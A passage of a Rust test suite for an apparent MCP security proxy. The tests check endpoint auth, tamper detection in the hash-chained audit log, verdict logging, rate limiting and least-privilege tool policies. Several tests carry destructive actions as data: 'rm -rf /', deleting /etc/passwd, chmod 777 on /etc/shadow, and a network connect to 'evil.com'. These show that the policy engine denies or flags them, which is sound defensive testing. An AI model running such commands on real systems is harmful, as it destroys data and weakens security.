            StatusCode::UNAUTHORIZED,
            "GET /api/policies without auth must be 401"
        );

        // GET /api/audit/entries without auth must be rejected
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/audit/entries")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "GET /api/audit/entries without auth must be 401"
        );

        // GET /api/audit/verify without auth must be rejected
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/audit/verify")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::UNAUTHORIZED,
            "GET /api/audit/verify without auth must be 401"
        );
    }

    #[tokio::test]
    async fn test_owasp_mcp07_sensitive_get_endpoints_succeed_with_auth() {
        let (state, _tmp) = make_state(Some("secure-key"));

        // GET /api/policies with auth must succeed
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/policies")
            .header("authorization", "Bearer secure-key")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "GET /api/policies with auth must succeed, got {}",
            resp.status()
        );

        // GET /api/audit/entries with auth must succeed
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/audit/entries")
            .header("authorization", "Bearer secure-key")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "GET /api/audit/entries with auth must succeed, got {}",
            resp.status()
        );

        // GET /api/audit/verify with auth must succeed
        let app = routes::build_router(state.clone());
        let req = Request::get("/api/audit/verify")
            .header("authorization", "Bearer secure-key")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "GET /api/audit/verify with auth must succeed, got {}",
            resp.status()
        );
    }
}

// ═══════════════════════════════════════════════════════════════
// MCP08 — Audit & Telemetry Integrity
//
// Risk: Attacker tampers with audit logs to hide malicious actions.
// Vellaveto coverage: EXCELLENT — SHA-256 hash chain with
//       length-prefixed encoding, chain verification on init,
//       automatic log rotation.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp08_hash_chain_detects_tampering() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let log_path = tmp.path().join("audit.log");
        let logger = AuditLogger::new(log_path.clone());

        // Create valid chain
        for i in 0..3 {
            let action = make_action("tool", "func", json!({"i": i}));
            logger
                .log_entry(&action, &Verdict::Allow, json!({}))
                .await
                .unwrap();
        }

        let v = logger.verify_chain().await.unwrap();
        assert!(v.valid, "Initial chain must be valid");

        // Tamper with the second entry
        let content = tokio::fs::read_to_string(&log_path).await.unwrap();
        let mut lines: Vec<String> = content.lines().map(|l| l.to_string()).collect();
        let mut entry: serde_json::Value = serde_json::from_str(&lines[1]).unwrap();
        entry["action"]["tool"] = json!("evil_tool");
        lines[1] = serde_json::to_string(&entry).unwrap();
        tokio::fs::write(&log_path, lines.join("\n") + "\n")
            .await
            .unwrap();

        // Chain must now be invalid
        let logger2 = AuditLogger::new(log_path);
        let v2 = logger2.verify_chain().await.unwrap();
        assert!(!v2.valid, "Tampered chain must be detected");
        assert_eq!(
            v2.first_broken_at,
            Some(1),
            "Break should be at tampered entry"
        );
    });
}

#[test]
fn test_owasp_mcp08_all_entries_have_hashes() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let verdicts = vec![
            Verdict::Allow,
            Verdict::Deny {
                reason: "blocked".to_string(),
            },
            Verdict::RequireApproval {
                reason: "review".to_string(),
            },
        ];

        for v in &verdicts {
            let action = make_action("tool", "func", json!({}));
            logger.log_entry(&action, v, json!({})).await.unwrap();
        }

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 3);

        for (i, entry) in entries.iter().enumerate() {
            assert!(entry.entry_hash.is_some(), "Entry {i} must have entry_hash");
            if i > 0 {
                assert!(
                    entry.prev_hash.is_some(),
                    "Entry {i} must chain to previous hash"
                );
                assert_eq!(
                    entry.prev_hash.as_ref(),
                    entries[i - 1].entry_hash.as_ref(),
                    "Entry {i} prev_hash must match entry {}'s hash",
                    i - 1
                );
            }
        }
    });
}

#[test]
fn test_owasp_mcp08_length_prefixed_encoding_prevents_collision() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();

        // Two entries with boundary-shifted fields must have different hashes
        let logger_a = AuditLogger::new(tmp.path().join("a.log"));
        let action_a = make_action("ab", "cd", json!({}));
        logger_a
            .log_entry(&action_a, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let logger_b = AuditLogger::new(tmp.path().join("b.log"));
        let action_b = make_action("abc", "d", json!({}));
        logger_b
            .log_entry(&action_b, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let entries_a = logger_a.load_entries().await.unwrap();
        let entries_b = logger_b.load_entries().await.unwrap();

        assert_ne!(
            entries_a[0].entry_hash, entries_b[0].entry_hash,
            "Boundary-shifted fields must produce different hashes"
        );
    });
}

#[test]
fn test_owasp_mcp08_verify_chain_api_endpoint() {
    let rt = runtime();
    rt.block_on(async {
        use arc_swap::ArcSwap;
        use axum::body::Body;
        use axum::http::Request;
        use tower::ServiceExt;
        use vellaveto_approval::ApprovalStore;
        use vellaveto_server::{routes, AppState, Metrics, RateLimits};

        let tmp = TempDir::new().unwrap();
        let logger = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));

        // Log an entry so verify has something to check
        let action = make_action("file", "read", json!({}));
        logger
            .log_entry(&action, &Verdict::Allow, json!({}))
            .await
            .unwrap();

        let state = AppState {
            policy_state: Arc::new(ArcSwap::from_pointee(vellaveto_server::PolicySnapshot {
                engine: PolicyEngine::new(false),
                policies: vec![],
                compliance_config: Default::default(),
            })),
            audit: Arc::clone(&logger),
            config_path: Arc::new("test.toml".to_string()),
            approvals: Arc::new(ApprovalStore::new(
                tmp.path().join("approvals.jsonl"),
                std::time::Duration::from_secs(900),
            )),
            api_key: None,
            rate_limits: Arc::new(RateLimits::disabled()),
            cors_origins: vec![],
            metrics: Arc::new(Metrics::default()),
            trusted_proxies: Arc::new(vec![]),
            policy_write_lock: Arc::new(tokio::sync::Mutex::new(())),
            prometheus_handle: None,
            tool_registry: None,
            cluster: None,
            rbac_config: vellaveto_server::rbac::RbacConfig::default(),
            tenant_config: vellaveto_server::tenant::TenantConfig::default(),
            tenant_store: None,
            tenant_rate_limiter: Arc::new(vellaveto_server::PerTenantRateLimiter::new()),
            idempotency: vellaveto_server::idempotency::IdempotencyStore::new(
                vellaveto_server::idempotency::IdempotencyConfig::default(),
            ),
            signup_lock: std::sync::Arc::new(tokio::sync::Mutex::new(())),
            webhook_dedup: std::sync::Arc::new(vellaveto_server::routes::billing::WebhookDedup::new(std::time::Duration::from_secs(600))),
            task_state: None,
            auth_level: None,
            iam_state: None,
            circuit_breaker: None,
            deputy: None,
            shadow_agent: None,
            schema_lineage: None,
            sampling_detector: None,
            exec_graph_store: None,
            etdi_store: None,
            etdi_verifier: None,
            etdi_attestations: None,
            etdi_version_pins: None,
            memory_security: None,
            nhi: None,
            observability: None,
            shadow_ai_discovery: None,
            least_agency_tracker: None,
            // Server Configuration (FIND-004, FIND-005)
            metrics_require_auth: true,
            audit_strict_mode: false,
            leader_election: None,
            service_discovery: None,
            deployment_config: Default::default(),
            start_time: std::time::Instant::now(),
            cached_discovered_endpoints: std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)),
            cached_instance_id: std::sync::Arc::new("test-instance".to_string()),
            discovery_engine: None,
            discovery_audit: None,
            projector_registry: None,
            zk_proofs: None,
            zk_audit_enabled: false,
            zk_audit_config: Default::default(),
            federation_resolver: None,
            billing_config: std::sync::Arc::new(vellaveto_server::BillingState {
                paddle: Default::default(),
                stripe: Default::default(),
                enabled: false,
                licensing_validation: vellaveto_config::LicenseValidation {
                    tier: vellaveto_config::LicenseTier::Community,
                    limits: vellaveto_config::LicenseTier::Community.limits(),
                    customer_id: None,
                    max_nodes: None,
                    max_endpoints: None,
                    reason: "test default".to_string(),
                },
            }),
            setup_completed: Arc::new(std::sync::atomic::AtomicBool::new(false)),
            wizard_sessions: Arc::new(dashmap::DashMap::new()),
            audit_query: Arc::new(vellaveto_audit::query::file::FileAuditQuery::new(
                Arc::clone(&logger),
            )),
            audit_store_status: vellaveto_types::audit_store::AuditStoreStatus {
                enabled: false,
                backend: vellaveto_types::audit_store::AuditStoreBackend::File,
                sink_healthy: false,
                pending_count: 0,
            },
            policy_lifecycle_store: None,
            policy_lifecycle_config: Default::default(),
            staging_snapshot: Arc::new(arc_swap::ArcSwap::from_pointee(None)),
            usage_tracker: None,
            topology_guard: None,
            topology_probe: None,
            recrawl_trigger: None,
        };

        let app = routes::build_router(state);
        let req = Request::get("/api/audit/verify")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "GET /api/audit/verify must succeed"
        );

        let body = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
            .await
            .unwrap();
        let result: serde_json::Value = serde_json::from_slice(&body).unwrap();
        assert_eq!(
            result["valid"], true,
            "Chain verification must return valid"
        );
    });
}

// ═══════════════════════════════════════════════════════════════
// MCP09 — Insufficient Logging
//
// Risk: Security events not logged, preventing forensic analysis
//       and incident response.
// Vellaveto coverage: All verdicts (Allow, Deny, RequireApproval)
//       are logged with full action details and metadata.
// ═══════════════════════════════════════════════════════════════

#[test]
fn test_owasp_mcp09_all_verdict_types_logged() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Log every verdict type
        let cases = vec![
            ("file", "read", Verdict::Allow),
            (
                "bash",
                "exec",
                Verdict::Deny {
                    reason: "policy violation".to_string(),
                },
            ),
            (
                "deploy",
                "push",
                Verdict::RequireApproval {
                    reason: "needs sign-off".to_string(),
                },
            ),
        ];

        for (tool, func, verdict) in &cases {
            let action = make_action(tool, func, json!({}));
            logger.log_entry(&action, verdict, json!({})).await.unwrap();
        }

        let entries = logger.load_entries().await.unwrap();
        assert_eq!(entries.len(), 3, "All 3 verdicts must be logged");

        assert!(matches!(entries[0].verdict, Verdict::Allow));
        assert!(matches!(entries[1].verdict, Verdict::Deny { .. }));
        assert!(matches!(
            entries[2].verdict,
            Verdict::RequireApproval { .. }
        ));
    });
}

#[test]
fn test_owasp_mcp09_denied_actions_include_reason() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let action = make_action("bash", "exec", json!({"command": "rm -rf /"}));
        let verdict = Verdict::Deny {
            reason: "blocked by security policy".to_string(),
        };
        logger
            .log_entry(&action, &verdict, json!({}))
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        match &entries[0].verdict {
            Verdict::Deny { reason } => {
                assert!(
                    reason.contains("security policy"),
                    "Deny reason must be preserved in audit log"
                );
            }
            other => panic!("Expected Deny, got {other:?}"),
        }
    });
}

#[test]
fn test_owasp_mcp09_action_details_preserved() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        let action = make_action(
            "file",
            "write",
            json!({"path": "/var/log/app.log", "content": "data"}),
        );
        logger
            .log_entry(&action, &Verdict::Allow, json!({"source": "test"}))
            .await
            .unwrap();

        let entries = logger.load_entries().await.unwrap();
        let entry = &entries[0];

        assert_eq!(entry.action.tool, "file", "Tool name must be logged");
        assert_eq!(entry.action.function, "write", "Function must be logged");
        assert_eq!(
            entry.action.parameters["path"], "/var/log/app.log",
            "Parameters must be logged"
        );
        assert!(!entry.id.is_empty(), "Entry must have an ID");
        assert!(!entry.timestamp.is_empty(), "Entry must have a timestamp");
    });
}

#[test]
fn test_owasp_mcp09_audit_report_counts_verdicts() {
    let rt = runtime();
    rt.block_on(async {
        let tmp = TempDir::new().unwrap();
        let logger = AuditLogger::new(tmp.path().join("audit.log"));

        // Log mixed verdicts
        for _ in 0..3 {
            let action = make_action("tool", "func", json!({}));
            logger
                .log_entry(&action, &Verdict::Allow, json!({}))
                .await
                .unwrap();
        }
        for _ in 0..2 {
            let action = make_action("tool", "func", json!({}));
            logger
                .log_entry(
                    &action,
                    &Verdict::Deny {
                        reason: "no".to_string(),
                    },
                    json!({}),
                )
                .await
                .unwrap();
        }
        let action = make_action("tool", "func", json!({}));
        logger
            .log_entry(
                &action,
                &Verdict::RequireApproval {
                    reason: "review".to_string(),
                },
                json!({}),
            )
            .await
            .unwrap();

        let report = logger.generate_report().await.unwrap();
        assert_eq!(report.total_entries, 6);
        assert_eq!(report.allow_count, 3);
        assert_eq!(report.deny_count, 2);
        assert_eq!(report.require_approval_count, 1);
    });
}

// ═══════════════════════════════════════════════════════════════
// MCP10 — Denial of Service
//
// Risk: Attacker overwhelms the proxy/server with oversized
//       messages, excessive requests, or resource exhaustion.
// Vellaveto coverage: MAX_LINE_LENGTH (1MB) for MCP framing,
//       per-category rate limiting, request body limits.
// ═══════════════════════════════════════════════════════════════

#[tokio::test]
async fn test_owasp_mcp10_oversized_mcp_message_rejected() {
    use std::io::Cursor;
    use tokio::io::BufReader;
    use vellaveto_mcp::framing::{read_message, FramingError};

    // 1MB+ line should be rejected
    let oversized = format!("{}\n", "X".repeat(1_048_577));
    let cursor = Cursor::new(oversized.into_bytes());
    let mut reader = BufReader::new(cursor);

    let result = read_message(&mut reader).await;
    assert!(result.is_err(), "Oversized line must be rejected");
    assert!(
        matches!(result.unwrap_err(), FramingError::LineTooLong(_)),
        "Error must be LineTooLong"
    );
}

#[tokio::test]
async fn test_owasp_mcp10_rate_limiting_rejects_excess_requests() {
    use arc_swap::ArcSwap;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use tower::ServiceExt;
    use vellaveto_approval::ApprovalStore;
    use vellaveto_server::{routes, AppState, Metrics, RateLimits};

    let tmp = TempDir::new().unwrap();
    let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));

    // Set rate limit to 1 request per second for evaluate
    let state = AppState {
        policy_state: Arc::new(ArcSwap::from_pointee(vellaveto_server::PolicySnapshot {
            engine: PolicyEngine::new(false),
            policies: vec![allow_policy("file:read", "Allow reads", 10)],
            compliance_config: Default::default(),
        })),
        audit: Arc::clone(&audit),
        config_path: Arc::new("test.toml".to_string()),
        approvals: Arc::new(ApprovalStore::new(
            tmp.path().join("approvals.jsonl"),
            std::time::Duration::from_secs(900),
        )),
        api_key: None, // No auth for simplicity
        rate_limits: Arc::new(RateLimits::new(Some(1), None, None)),
        cors_origins: vec![],
        metrics: Arc::new(Metrics::default()),
        trusted_proxies: Arc::new(vec![]),
        policy_write_lock: Arc::new(tokio::sync::Mutex::new(())),
        prometheus_handle: None,
        tool_registry: None,
        cluster: None,
        rbac_config: vellaveto_server::rbac::RbacConfig::default(),
        tenant_config: vellaveto_server::tenant::TenantConfig::default(),
        tenant_store: None,
        tenant_rate_limiter: Arc::new(vellaveto_server::PerTenantRateLimiter::new()),
        idempotency: vellaveto_server::idempotency::IdempotencyStore::new(
            vellaveto_server::idempotency::IdempotencyConfig::default(),
        ),
        signup_lock: std::sync::Arc::new(tokio::sync::Mutex::new(())),
        webhook_dedup: std::sync::Arc::new(vellaveto_server::routes::billing::WebhookDedup::new(std::time::Duration::from_secs(600))),
        task_state: None,
        auth_level: None,
        iam_state: None,
        circuit_breaker: None,
        deputy: None,
        shadow_agent: None,
        schema_lineage: None,
        sampling_detector: None,
        exec_graph_store: None,
        etdi_store: None,
        etdi_verifier: None,
        etdi_attestations: None,
        etdi_version_pins: None,
        memory_security: None,
        nhi: None,
        observability: None,
        shadow_ai_discovery: None,
        least_agency_tracker: None,
        // Server Configuration (FIND-004, FIND-005)
        metrics_require_auth: true,
        audit_strict_mode: false,
        leader_election: None,
        service_discovery: None,
        deployment_config: Default::default(),
        start_time: std::time::Instant::now(),
        cached_discovered_endpoints: std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)),
        cached_instance_id: std::sync::Arc::new("test-instance".to_string()),
        discovery_engine: None,
        discovery_audit: None,
        projector_registry: None,
        zk_proofs: None,
        zk_audit_enabled: false,
        zk_audit_config: Default::default(),
        federation_resolver: None,
        billing_config: std::sync::Arc::new(vellaveto_server::BillingState {
            paddle: Default::default(),
            stripe: Default::default(),
            enabled: false,
            licensing_validation: vellaveto_config::LicenseValidation {
                tier: vellaveto_config::LicenseTier::Community,
                limits: vellaveto_config::LicenseTier::Community.limits(),
                customer_id: None,
                max_nodes: None,
                max_endpoints: None,
                reason: "test default".to_string(),
            },
        }),
        setup_completed: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        wizard_sessions: Arc::new(dashmap::DashMap::new()),
        audit_query: Arc::new(vellaveto_audit::query::file::FileAuditQuery::new(
            Arc::clone(&audit),
        )),
        audit_store_status: vellaveto_types::audit_store::AuditStoreStatus {
            enabled: false,
            backend: vellaveto_types::audit_store::AuditStoreBackend::File,
            sink_healthy: false,
            pending_count: 0,
        },
        policy_lifecycle_store: None,
        policy_lifecycle_config: Default::default(),
        staging_snapshot: Arc::new(arc_swap::ArcSwap::from_pointee(None)),
        usage_tracker: None,
        topology_guard: None,
        topology_probe: None,
        recrawl_trigger: None,
    };

    let body_str = r#"{"tool":"file","function":"read","parameters":{}}"#;

    // First request should succeed
    let app = routes::build_router(state.clone());
    let req = Request::post("/api/evaluate")
        .header("content-type", "application/json")
        .body(Body::from(body_str))
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    assert!(
        resp.status().is_success(),
        "First request within rate limit must succeed, got {}",
        resp.status()
    );

    // Rapid second request should be rate-limited
    let app = routes::build_router(state.clone());
    let req = Request::post("/api/evaluate")
        .header("content-type", "application/json")
        .body(Body::from(body_str))
        .unwrap();
    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(
        resp.status(),
        StatusCode::TOO_MANY_REQUESTS,
        "Second rapid request must be rate-limited"
    );
}

#[test]
fn test_owasp_mcp10_normal_sized_message_accepted() {
    let rt = runtime();
    rt.block_on(async {
        use std::io::Cursor;
        use tokio::io::BufReader;
        use vellaveto_mcp::framing::read_message;

        let msg = serde_json::json!({"jsonrpc": "2.0", "id": 1, "method": "ping"});
        let data = format!("{}\n", serde_json::to_string(&msg).unwrap());
        let cursor = Cursor::new(data.into_bytes());
        let mut reader = BufReader::new(cursor);

        let result = read_message(&mut reader).await.unwrap();
        assert!(result.is_some(), "Normal-sized message must be accepted");
    });
}

// ═══════════════════════════════════════════════════════════════
// Excessive Agency (OWASP Agentic Top 10)
//
// Risk: Tool grants broader than needed — a tool with wildcard
//       permissions when only specific operations are required.
// Vellaveto coverage: Policy engine enforces least-privilege by
//       denying actions that fall outside specific allow rules.
// ═══════════════════════════════════════════════════════════════

/// FIND-R46-IT-001: Overly permissive tool grants must be denied when a
/// more specific deny rule exists at equal or higher priority.
#[test]
fn test_owasp_excessive_agency_broad_grant_denied() {
    let engine = PolicyEngine::new(false);

    // Scenario: An agent has a broad "allow all file ops" grant,
    // but security policy restricts to read-only access.
    let mut policies = vec![
        allow_policy("file:*", "Broad file access", 10),
        deny_policy("file:write", "Block file writes", 100),
        deny_policy("file:delete", "Block file deletes", 100),
        deny_policy("file:exec", "Block file exec", 100),
    ];
    PolicyEngine::sort_policies(&mut policies);

    // Read should be allowed
    let read_action = make_action("file", "read", json!({"path": "/tmp/data.txt"}));
    let verdict = engine.evaluate_action(&read_action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Allow),
        "file:read should be allowed: got {verdict:?}"
    );

    // Write, delete, exec should all be denied (excessive agency blocked)
    for func in &["write", "delete", "exec"] {
        let action = make_action("file", func, json!({"path": "/tmp/data.txt"}));
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        assert!(
            matches!(verdict, Verdict::Deny { .. }),
            "file:{func} should be denied (excessive agency): got {verdict:?}"
        );
    }
}

/// FIND-R46-IT-001: Wildcard tool grant with no deny rules but strict
/// allowlist still blocks unregistered functions (fail-closed).
#[test]
fn test_owasp_excessive_agency_unregistered_tool_denied() {
    let engine = PolicyEngine::new(false);

    // Only file:read is explicitly allowed, everything else is denied
    let policies = vec![allow_policy("file:read", "Only file reads", 100)];

    // An unregistered tool:function combination should be denied
    let action = make_action(
        "file",
        "chmod",
        json!({"path": "/etc/shadow", "mode": "777"}),
    );
    let verdict = engine.evaluate_action(&action, &policies).unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Unregistered tool function file:chmod should be denied: got {verdict:?}"
    );
}

/// FIND-R46-IT-001: Broad wildcard grant without compensating deny must
/// not silently allow dangerous operations when no deny exists.
/// This verifies the *:* pattern actually matches everything.
#[test]
fn test_owasp_excessive_agency_wildcard_grants_everything() {
    let engine = PolicyEngine::new(false);

    // A single *:* allow with NO deny rules grants everything — this is the risk
    let policies = vec![allow_policy("*:*", "Allow everything", 100)];

    let dangerous_ops = vec![
        ("bash", "exec", json!({"command": "rm -rf /"})),
        ("network", "connect", json!({"host": "evil.com"})),
        ("file", "delete", json!({"path": "/etc/passwd"})),
    ];

    for (tool, func, params) in &dangerous_ops {
        let action = make_action(tool, func, params.clone());
        let verdict = engine.evaluate_action(&action, &policies).unwrap();
        assert!(
            matches!(verdict, Verdict::Allow),
            "*:* allow grants {tool}:{func} — this demonstrates excessive agency risk: got {verdict:?}"
        );
    }

    // Now add compensating deny rules — they should override the broad grant
    let mut restricted_policies = vec![
        allow_policy("*:*", "Allow everything", 10), // low priority
        deny_policy("bash:*", "Block all bash", 100), // high priority
        deny_policy("network:*", "Block all network", 100),
    ];
    PolicyEngine::sort_policies(&mut restricted_policies);

    let action = make_action("bash", "exec", json!({"command": "rm -rf /"}));
    let verdict = engine
        .evaluate_action(&action, &restricted_policies)
        .unwrap();
    assert!(
        matches!(verdict, Verdict::Deny { .. }),
        "Compensating deny must block excessive agency: got {verdict:?}"
    );
}

#[tokio::test]
async fn test_owasp_mcp10_disabled_rate_limit_allows_all() {
    use arc_swap::ArcSwap;
    use axum::body::Body;
    use axum::http::Request;
    use tower::ServiceExt;
    use vellaveto_approval::ApprovalStore;
    use vellaveto_server::{routes, AppState, Metrics, RateLimits};

    let tmp = TempDir::new().unwrap();
    let audit = Arc::new(AuditLogger::new(tmp.path().join("audit.log")));
    let state = AppState {
        policy_state: Arc::new(ArcSwap::from_pointee(vellaveto_server::PolicySnapshot {
            engine: PolicyEngine::new(false),
            policies: vec![allow_policy("file:read", "Allow", 10)],
            compliance_config: Default::default(),
        })),
        audit: Arc::clone(&audit),
        config_path: Arc::new("test.toml".to_string()),
        approvals: Arc::new(ApprovalStore::new(
            tmp.path().join("approvals.jsonl"),
            std::time::Duration::from_secs(900),
        )),
        api_key: None,
        rate_limits: Arc::new(RateLimits::disabled()),
        cors_origins: vec![],
        metrics: Arc::new(Metrics::default()),
        trusted_proxies: Arc::new(vec![]),
        policy_write_lock: Arc::new(tokio::sync::Mutex::new(())),
        prometheus_handle: None,
        tool_registry: None,
        cluster: None,
        rbac_config: vellaveto_server::rbac::RbacConfig::default(),
        tenant_config: vellaveto_server::tenant::TenantConfig::default(),
        tenant_store: None,
        tenant_rate_limiter: Arc::new(vellaveto_server::PerTenantRateLimiter::new()),
        idempotency: vellaveto_server::idempotency::IdempotencyStore::new(
            vellaveto_server::idempotency::IdempotencyConfig::default(),
        ),
        signup_lock: std::sync::Arc::new(tokio::sync::Mutex::new(())),
        webhook_dedup: std::sync::Arc::new(vellaveto_server::routes::billing::WebhookDedup::new(std::time::Duration::from_secs(600))),
        task_state: None,
        auth_level: None,
        iam_state: None,
        circuit_breaker: None,
        deputy: None,
        shadow_agent: None,
        schema_lineage: None,
        sampling_detector: None,
        exec_graph_store: None,
        etdi_store: None,
        etdi_verifier: None,
        etdi_attestations: None,
        etdi_version_pins: None,
        memory_security: None,
        nhi: None,
        observability: None,
        shadow_ai_discovery: None,
        least_agency_tracker: None,
        // Server Configuration (FIND-004, FIND-005)
        metrics_require_auth: true,
        audit_strict_mode: false,
        leader_election: None,
        service_discovery: None,
        deployment_config: Default::default(),
        start_time: std::time::Instant::now(),
        cached_discovered_endpoints: std::sync::Arc::new(std::sync::atomic::AtomicU64::new(0)),
        cached_instance_id: std::sync::Arc::new("test-instance".to_string()),
        discovery_engine: None,
        discovery_audit: None,
        projector_registry: None,
        zk_proofs: None,
        zk_audit_enabled: false,
        zk_audit_config: Default::default(),
        federation_resolver: None,
        billing_config: std::sync::Arc::new(vellaveto_server::BillingState {
            paddle: Default::default(),
            stripe: Default::default(),
            enabled: false,
            licensing_validation: vellaveto_config::LicenseValidation {
                tier: vellaveto_config::LicenseTier::Community,
                limits: vellaveto_config::LicenseTier::Community.limits(),
                customer_id: None,
                max_nodes: None,
                max_endpoints: None,
                reason: "test default".to_string(),
            },
        }),
        setup_completed: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        wizard_sessions: Arc::new(dashmap::DashMap::new()),
        audit_query: Arc::new(vellaveto_audit::query::file::FileAuditQuery::new(
            Arc::clone(&audit),
        )),
        audit_store_status: vellaveto_types::audit_store::AuditStoreStatus {
            enabled: false,
            backend: vellaveto_types::audit_store::AuditStoreBackend::File,
            sink_healthy: false,
            pending_count: 0,
        },
        policy_lifecycle_store: None,
        policy_lifecycle_config: Default::default(),
        staging_snapshot: Arc::new(arc_swap::ArcSwap::from_pointee(None)),
        usage_tracker: None,
        topology_guard: None,
        topology_probe: None,
        recrawl_trigger: None,
    };

    let body_str = r#"{"tool":"file","function":"read","parameters":{}}"#;

    // Multiple rapid requests should all succeed with rate limiting disabled
    for i in 0..5 {
        let app = routes::build_router(state.clone());
        let req = Request::post("/api/evaluate")
            .header("content-type", "application/json")
            .body(Body::from(body_str))
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert!(
            resp.status().is_success(),
            "Request {i} must succeed with rate limiting disabled, got {}",
            resp.status()
        );
    }
}
